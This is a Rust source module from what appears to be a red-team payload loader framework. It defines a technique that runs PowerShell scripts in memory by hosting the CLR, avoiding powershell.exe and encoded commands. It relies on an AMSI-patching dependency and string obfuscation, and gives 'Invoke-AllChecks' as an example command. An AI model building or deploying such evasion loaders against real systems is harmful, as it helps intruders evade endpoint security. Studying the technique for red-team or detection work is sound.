//! PowerShell hosting.
//!
//! Runs a `.ps1` payload in the loader's own process by hosting Windows
//! PowerShell on the CLR: no `powershell.exe`, no `-EncodedCommand`, no temp
//! file. The script is a **text** payload, so the packer first compiles a small
//! managed launcher around it (see `engine::managed`) and this technique hosts
//! that launcher exactly like `dotnet_hosting` hosts a managed assembly. See
//! `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{dotnet_hosting, Capability, Category, PayloadFormat, Stability, TechniqueDef};

/// How the hosted engine is driven.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    /// Load the script and run the configured invocation (or the script itself).
    #[default]
    Run,
    /// Load the script and leave an interactive prompt.
    Interactive,
}

/// How the loader's own run-time arguments combine with the baked `command`.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CommandMode {
    /// The run-time arguments replace `command` (the common case: type a
    /// different command without rebuilding).
    #[default]
    Override,
    /// The run-time arguments are appended to `command` (`Invoke-AllChecks -Verbose`).
    Join,
}

/// Parameters for PowerShell hosting.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to load. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,

    /// How the engine is driven (`run` or `interactive`).
    #[serde(default)]
    pub mode: Mode,

    /// The **default** invocation, run after the script is loaded. Optional: a
    /// self-executing script needs none. The operator's run-time arguments
    /// override (or append to) it according to `command_mode`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,

    /// How the run-time arguments combine with `command`.
    #[serde(default)]
    pub command_mode: CommandMode,
}

/// Static metadata for PowerShell hosting.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "powershell_hosting",
    // T1059.001: PowerShell. T1620: the script is loaded and run from memory.
    attck: &["T1059.001", "T1620"],
    // Measured on the lab host (2026-10-11): the artifact runs the script
    // in-process. With real-time protection on, the `patch_amsi` dependency is
    // intermittently interfered with (~2/3 runs), so the recorded stable case is
    // the Defender-off lab host (README, `docs/measurements.md`).
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/powershell_hosting/README.md",
    // The payload is compiled to a managed launcher at build time; hosting it is
    // `dotnet_hosting`'s CLR-hosting fragment unchanged, so it is shared rather
    // than duplicated (the two cannot drift).
    stub_fragment: include_str!("../dotnet_hosting/stub_fragment.rs"),
    formats: &[PayloadFormat::Powershell],
    requires_indirect_syscalls: false,
    params_example: "technique: powershell_hosting\nparams:\n  mode: run\n  command: Invoke-AllChecks\n  command_mode: override\n",
    readme: include_str!("README.md"),
    // The hosted CLR does its own memory management; the fragment issues no Nt*
    // call.
    syscalls: &[],
    // The payload's imports belong to the managed launcher, which the CLR
    // resolves itself.
    resolves_imports: false,
};

impl Params {
    /// Renders the hosting fragment.
    ///
    /// The build compiles the `.ps1` into a managed assembly, so running it is
    /// exactly `dotnet_hosting`'s job; this delegates to that fragment's
    /// renderer (CLR version, diagnostics, all obfuscated the same way) instead
    /// of keeping a second copy in step.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let host = dotnet_hosting::Params {
            payload: self.payload.clone(),
        };
        host.render_fragment(strings)
    }
}

#[cfg(test)]
mod tests;
